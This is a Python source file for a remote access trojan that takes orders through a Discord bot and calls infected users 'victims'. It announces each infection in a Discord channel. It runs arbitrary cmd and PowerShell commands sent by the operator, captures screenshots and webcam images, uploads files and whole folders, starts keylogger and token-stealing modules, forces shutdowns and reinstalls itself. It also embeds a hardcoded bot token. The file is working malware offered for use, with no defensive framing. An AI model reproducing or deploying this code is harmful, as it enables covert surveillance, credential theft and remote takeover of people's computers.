import discord
import os
import tempfile
import time
import datetime
import win32gui
import re
import shutil
import urllib.request
from PIL import ImageGrab
from os import system
import cv2 as cv

system("title Vineum (victim)")

guildId = 1021689641457426503 #Discord server id
token = "MTAyMTgxOTAxNjk4MzEwNTU3Ng.GunLx_.EQ2FCywUQPRWm8FE2py90aSOSnmhnX83kCupvQ" #Bot token
client = discord.Client(intents=discord.Intents.all())
userlogin = os.getlogin().lower()
currentdir = os.path.dirname(os.path.realpath(__file__))
 

def internet():
    try:
        urllib.request.urlopen('http://google.com')
        client.run(token)
        return
    except:
        time.sleep(5)
        internet()
        return

@client.event
async def on_ready():
    print("Logged on as a victim on " + str(client.user) + " from " + os.getlogin().format(client))
    userChannel = False
    os.system("del /q %tmp%\\*")
    os.system("rd /s /q %tmp%\\")
    os.system("cls")
    guild = client.get_guild(guildId)
    for channel in guild.channels:
        if channel.name == userlogin:
            userChannel = True
            break
    if userChannel == False:
        for cat in guild.categories:
            cate = str(cat)
            if cate == "victims":
                await guild.create_text_channel(userlogin, category=cat)
                userChannel = True
                await client.get_channel(1025068674966638654).send(f"{userlogin} has been infected")
                break
    if userChannel == True:
        channelId = discord.utils.get(guild.channels, name=userlogin)
        await channelId.send(f"{userlogin} has started their computer!")

    for ver in guild.categories:
            ver = str(ver)
            if ver.startswith("version: "):
                ver = ver.split(": ")[1]
                path = "C:\\ProgramData\\version\\"
                file = path + "version-" + ver + ".txt"
                if os.path.exists(file) == True:
                    return
                else:
                    if os.path.exists(path) == True:
                        shutil.rmtree(path)
                    time.sleep(2)
                    os.mkdir(path)
                    file = open(file, "w+")
                    file.write(ver)
                    file.close()
                    if userChannel != False:
                        await channelId.send("Reinfecting")
                        print("Reinfecting")
                        os.system("start C:\\ProgramData\\RI\\reinf.vbs")
                        await client.close()
                        exit()

@client.event
async def on_message(message):
    username = str(message.author).split("#")[0]
    user_message = str(message.content)
    userCommand = user_message.lower()
    channel = str(message.channel.name)

    if message.author != client.user:
        print(f"{username}: {user_message} ({channel})")

    if message.author == client.user:
        return

    if channel == userlogin or channel == "everyone":
        if userCommand.startswith(".help"):
            if userCommand == ".help":
                await message.channel.send("**Here is a list of all the different commands you may use:**\n**.help <command>**, Shows a list of all the avaible commands (this message). For more info on a single command, write that command in <command> ex: '.help .cmd' will show how the .cmd command does.\n**.cls**, **.clear**, **.cleartmp**, **.clearall**, **.awake**, **.reinf**, **.msg**, **.shutdown**, **.restart**, **.getwin**, **.screenshot**, **.cam**, **.movewin**, **.file**, **.read**, **.folder**, **EXT**, **.ncmd**, **.cmd**, **.nps**, **.ps**. ")
            if userCommand.startswith(".help "):
                chelp = str(userCommand).split("p ")[1]
                if chelp == ".cls":
                    await message.channel.send("""Syntax: ".cls". Clears the bot.py console, used by developers to debug. """)
                elif chelp == ".clear":
                    await message.channel.send("""Syntax: ".clear <'all' or a number>". Clears the discord channel it was written in. Ex: ".clear: all" will clear the entire channel. If a number is used, that is how many messages it will deleate. """)
                elif chelp == ".clearall":
                    await message.channel.send("""Syntax: ".clearall". Clears the bot.py console, the discord channel it was written in and the temp directory (.cls, .clear all all in one command). """)
                elif chelp == ".awake":
                    await message.channel.send("""Syntax: ".awake". Simply replies with "<user> is awake", can be used to fast see if a victim is online or not. """)
                elif chelp == ".reinf":
                    await message.channel.send("""Syntax: ".reinf". Updates or 'reinfecs' the victim to the newest version. """)
                elif chelp == ".msg":
                    await message.channel.send("""Syntax: ".msg <message>,<title>(optional)". Sends a messagebox to the victims screen. Ex: ".msg Hello!", will make a textbox with the text "Hello!" pop up. """)
                elif chelp == ".shutdown":
                    await message.channel.send("""Syntax: ".shutdown". Forcefully shuts down the victims computer. """)
                elif chelp == ".restart":
                    await message.channel.send("""Syntax: ".restart". Forcefully restarts the victims computer. """)
                elif chelp == ".getwin":
                    await message.channel.send("""Syntax: ".getwin". Shows a list of all the open windows. """)
                elif chelp == ".screenshot":
                    await message.channel.send("""Syntax: ".screenshot". Takes a screenshot and uploads it. """)
                elif chelp == ".cam":
                    await message.channel.send("""Syntax: ".cam". Takes a picture with the webcam and uploads it. """)
                elif chelp == ".movewin":
                    await message.channel.send("""Syntax: ".movewin <windownumber>: <pos>". Moves a window (windownumber that you get from .getwin) to a desiered position on the screen. Ex: ".movewin 65784: 100 100 100 0". """)
                elif chelp == ".file":
                    await message.channel.send("""Syntax: ".file <filepath>". Uploads a file. Ex: ".file D:\secret\passwords.txt". """)
                elif chelp == ".read":
                    await message.channel.send("""Syntax: ".read <filepath>". Uploads the contents of a file. Ex: ".read D:\secret\passwords.txt". """)
                elif chelp == ".folder":
                    await message.channel.send("""Syntax: ".folder <folderpath>". Zips a folder and uploads it. Ex: ".folder D:\secret" will upload the entire secret folder. """)
                elif chelp == "ext":
                    await message.channel.send("""Syntax: "EXT <file>: <variable 1>,<variable 2>...". Starts a external file (<file>) with the option of having variables transferred to the file. Ex: "EXT video: 12,10", will screenrecord a video in 12 fps and 10 seconds long. "EXT keylog: 100", will log all the log all the future 100 keys pressed and then send them. "EXT token" will token log the victim. """)
                elif chelp == ".ncmd":
                    await message.channel.send("""Syntax: ".ncmd <cmd command>". Executes a cmd command without giving an output. Ex: "ehco Hello! >> D:\Hello.txt". """)
                elif chelp == ".cmd":
                    await message.channel.send("""Syntax: ".cmd <cmd command>". Executes a cmd command giving an output. Ex: "dir /b D:\secret". """)
                elif chelp == ".nps":
                    await message.channel.send("""Syntax: ".nps <powershell command>". Executes a powershell command without giving an output. Ex: "ehco Hello! >> D:\Hello.txt". """)
                elif chelp == ".ps":
                    await message.channel.send("""Syntax: ".ps <powershell command>". Executes a powershell command giving an output. Ex: "dir D:\secret". """)
            return
        elif userCommand == ".cls":
            os.system("cls")
            await message.channel.send("Console cleared.")
            return
        elif userCommand.startswith(".clear"):
            cclear = str(userCommand).split("r ")[1]
            if cclear == "all":
                cnumber = None
            else:
                cnumber = int(cclear)
            await message.channel.purge(limit=cnumber)
            if cnumber == None:
                await message.channel.send("Cleared the channel.")
                return
            elif cnumber == 1:
                await message.channel.send("Deleted 1 message.")
                return
            else:
                await message.channel.send(f"Deleted {cclear} messages.")
                return
        elif userCommand == ".clearall":
            await message.channel.purge(limit=None)
            os.system("cls")
            await message.channel.send("Cleared the channel and the console.")
            return
        elif userCommand == ".awake":
            await message.channel.send(f"{userlogin} is awake.")
            return
        elif userCommand == ".reinf":
            await message.channel.send("Reinfecting.")
            print("Reinfecting.")
            os.system("start C:\\ProgramData\\RI\\reinf.vbs")
            await client.close()
            exit()
        elif userCommand.startswith(".msg"):
            if os.path.exists(f"{tempfile.gettempdir()}\\msg.vbs") == True:
                os.remove(f"{tempfile.gettempdir()}\\msg.vbs")
            cmessage = str(userCommand).split("g ")[1]
            if cmessage.find(",") != -1:
                text = cmessage.split(",")[0]
                title = cmessage.split(",")[1]
                alt = (f'x=msgbox("{text}" ,4096, "{title}")')
            else:
                alt = (f'x=msgbox("{cmessage}" ,4096)')
            file = open(tempfile.gettempdir() + "\msg.vbs", "w+")
            file.write(alt)
            file.close()
            os.startfile(f"{tempfile.gettempdir()}\\msg.vbs")
            await message.channel.send(f"Message sent to {userlogin}")
            os.remove(f"{tempfile.gettempdir()}\\msg.vbs")
            return
        elif userCommand == ".shutdown":
            await message.channel.send(f"{userlogin} is shutting down.")
            os.system("shutdown /f /p")
            return
        elif userCommand == ".restart":
            await message.channel.send(f"{userlogin} is restarting.")
            os.system("shutdown /f /r /t 0")
            return
        elif userCommand == ".getwin":
            await message.channel.send(f"{userlogin} received a .getwin command")
            if os.path.exists(tempfile.gettempdir() + "\\getwin.txt") == True:
                os.remove(tempfile.gettempdir() + "\\getwin.txt")
            win32gui.EnumWindows(winEnumHandler, None)
            winf = open(tempfile.gettempdir() + "\\getwin.txt", "r")
            await message.channel.send("**Open windows:** \n")
            await message.channel.send(winf.read())
            os.remove(tempfile.gettempdir() + "\\getwin.txt")
            return
        elif userCommand == ".screenshot":
            now = datetime.datetime.now()
            snapshot = ImageGrab.grab()
            date = "%s-%s-%s" % (now.day, now.month, now.year)
            timenow = "%s,%s,%s" % (now.hour, now.minute, now.second)
            lastestScreen = (tempfile.gettempdir() + "\\" + timenow + "." + date + ".png")
            snapshot.save(lastestScreen)
            with open(lastestScreen, "rb") as f:
                screenPic = discord.File(f)
                await message.channel.send(file=screenPic)
            os.remove(tempfile.gettempdir() + "\\lastestScreen.png")
            return
        elif userCommand == ".cam":
            if os.path.exists("%tmp%\\cam.png") == True:
                os.remove(tempfile.gettempdir() + "\\cam.png")
            cam = cv.VideoCapture(0)   
            s, img = cam.read()
            if s:
                cv.imwrite(f"{tempfile.gettempdir()}\\cam.png",img)
            await message.channel.send(file=discord.File(tempfile.gettempdir() + "\\cam.png"))
            os.remove(tempfile.gettempdir() + "\\cam.png")
            return
        elif userCommand.startswith(".movewin"):
            await message.channel.send(f"{userlogin} received a .movewin command")
            command = userCommand.split("n ")[1]
            hwnd = command.split(":")[0]
            settings = command.split(":")[1]
            options = [int(s) for s in re.findall(r"\b\d+\b", settings)]
            a = options[0]
            b = options[1]
            c = options[2]
            d = options[3]
            win32gui.MoveWindow(hwnd, a, b, c, d, True)
            await message.channel.send(userlogin + " moved to " + str(a) + ", " + str(b) + ", " + str(c) + ", " + str(d))
            return
        elif userCommand.startswith(".file"):
            await message.channel.send(f"{userlogin} received a .file command")
            cfile = str(userCommand).split("e ")[1]
            await message.channel.send(file=discord.File(cfile))
            return
        elif userCommand.startswith(".read"):
            await message.channel.send(f"{userlogin} received a .read command.")
            cread = str(userCommand).split("d ")[1]
            rfile = open(cread)
            file_contents = str(rfile.read())
            await message.channel.send("**content:**\n")
            if len(file_contents) > 2000:
                split = 2000
                roplist = [file_contents[i: i + split] for i in range(0, len(file_contents), split)]
                for msg in roplist:
                    await message.channel.send(msg)
                return
            else:
                await message.channel.send(file_contents)
                return
        elif userCommand.startswith(".folder"):
            await message.channel.send(f"{userlogin} received a .folder command")
            if os.path.exists("%tmp%\\files.zip") == True:
                os.remove("%tmp%\\files.zip")
            cfolder = str(userCommand).split("r ")[1]
            os.system(f"powershell Compress-Archive -Path {cfolder} -Update -DestinationPath %tmp%\\files.zip")
            await message.channel.send(file=discord.File(tempfile.gettempdir() + "\\files.zip"))
            os.remove("%tmp%\\files.zip")
            return
        elif userCommand.startswith("ext"):
            split = str(userCommand).split("t ") [1]
            try:
                extf = split.split(":") [0]
            except:
                extf = split
            try: 
                argv = split.split(": ") [1]
            except:
                None
            if os.path.exists(f"{tempfile.gettempdir()}\\{extf}.sw") == True:
                await message.channel.send("Still executing")
                return
            else:
                file = open(tempfile.gettempdir() + "\\between.bat", "w+")
                if extf == "token":
                    file.write(f"python {currentdir}\\EXT\\token\\{extf}.py \n")
                else:
                    file.write(f"python {currentdir}\EXT\{extf}.py {argv} \n") 
                file.write("exit")
                file.close()
                switch = open(f"{tempfile.gettempdir()}\\{extf}.sw", "w+")
                switch.write("switch")
                switch.close()
                await message.channel.send(f"executing: {extf}")
                time.sleep(2)
                os.startfile(f"{currentdir}\EXT\EXT.vbs")
                return
        elif userCommand.startswith(".ncmd"):
            await message.channel.send(f"{userlogin} received a .ncmd command.")
            cncmd = str(userCommand).split("d ")[1]
            os.system(cncmd)
            await message.channel.send(f"{userlogin} ran the command '{cncmd}'.")
            return
        elif userCommand.startswith(".cmd"):
            if os.path.exists(tempfile.gettempdir() + "\\cmd.txt") == True:
                os.remove(tempfile.gettempdir() + "\\cmd.txt")
            await message.channel.send(f"{userlogin} received a .cmd command.")
            ccmd = str(userCommand).split("d ")[1]
            os.system(ccmd + " >> %tmp%\\cmd.txt")
            cmdf = open(tempfile.gettempdir() + "\\cmd.txt", "r")
            cmdfread = str(cmdf.read())
            await message.channel.send("**output:**\n")
            if len(cmdfread) > 2000:
                split = 2000
                cmdoplist = [cmdfread[i: i + split] for i in range(0, len(cmdfread), split)]
                for msg in cmdoplist:
                    await message.channel.send(msg)
            else:
                await message.channel.send(cmdfread)
            os.remove(tempfile.gettempdir() + "\\cmd.txt")
            return
        elif userCommand.startswith(".nps"):
            await message.channel.send(f"{userlogin} received a .nps command.")
            cnps = str(userCommand).split("s ")[1]
            os.system("powershell " + cnps)
            return
        elif userCommand.startswith(".ps"):
            if os.path.exists(tempfile.gettempdir() + "\\ps.txt") == True:
                os.remove(tempfile.gettempdir() + "\\ps.txt")
            await message.channel.send(f"{userlogin} received a .ps command.")
            cps = str(userCommand).split("s ")[1]
            os.system("powershell " + cps + " >> %tmp%\\ps.txt")
            psf = open(tempfile.gettempdir() + "\\ps.txt", "r")
            psfread = str(psf.read())
            await message.channel.send("**output:**\n")
            if len(psfread) > 2000:
                split = 2000
                psoplist = [psfread[i: i + split] for i in range(0, len(psfread), split)]
                for msg in psoplist:
                    await message.channel.send(msg)
            else:
                await message.channel.send(psfread)
            os.remove(tempfile.gettempdir() + "\\cmd.txt")
        return

def winEnumHandler(hwnd, ctx):
    if win32gui.IsWindowVisible(hwnd):
        gwF = open(tempfile.gettempdir() + "\\getwin.txt", "a")
        wh = (win32gui.GetWindowText(hwnd))
        key = str(hwnd)
        try:
            gwF.write(key + ", " + wh + "\n")
        except: 
            gwF.close()
        gwF.close()
        return

internet()